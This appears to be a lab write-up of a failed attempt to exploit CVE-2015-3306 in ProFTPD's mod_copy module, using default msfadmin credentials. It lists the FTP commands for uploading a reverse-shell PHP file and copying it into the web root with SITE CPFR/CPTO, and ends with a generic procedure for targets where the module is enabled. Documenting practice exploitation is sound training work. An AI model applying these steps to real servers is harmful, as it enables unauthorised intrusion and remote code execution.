# ProFTPD mod_copy Exploit Attempt (CVE-2015-3306)

## Target Details

- **Service**: ProFTPD 1.3.1
- **Port**: 2121
- **Authentication**: Successful using `msfadmin:msfadmin`
- **Exploit Type**: Arbitrary File Copy via `mod_copy` module

## Objective

Leverage the vulnerable `mod_copy` module to move a malicious `shell.php` file from the FTP upload directory into Apache's web root (`/var/www/html/`) and trigger a reverse shell.

---

## Steps Taken

1. **Connected to ProFTPD**
   ```bash
   ftp 192.168.6.3 2121

2. Authenticated successfully using:
    Username: msfadmin
    Password: msfadmin


3. Uploaded reverse shell:
    put shell.php

4. Attempted to execute:
    quote SITE CPFR /home/msfadmin/shell.php
    quote SITE CPTO /var/www/html/shell.php

5. Resulted in:
    500 'SITE CPFR' not understood

6. Ran quote HELP to confirm module support. Output:
    No SITE CPFR or CPTO listed. `mod_copy` is not enabled.

# Outcome

Exploit failed due to mod_copy module not being present or enabled on this ProFTPD instance. The necessary commands (SITE CPFR, SITE CPTO) were not available, blocking the core mechanism of the attack.

# Lessons learned

Even vulnerable versions may not have exploitable modules compiled or enabled.

Always validate server features (quote HELP) before attempting feature-specific exploits.

Upload capability without file movement limits post-exploitation.

# Future Notes

If the target ProFTPD build supports mod_copy, the exploit remains viable:

- Upload payload to writable path

- Copy to /var/www/html/ using SITE CPFR/CPTO

- Trigger via browser
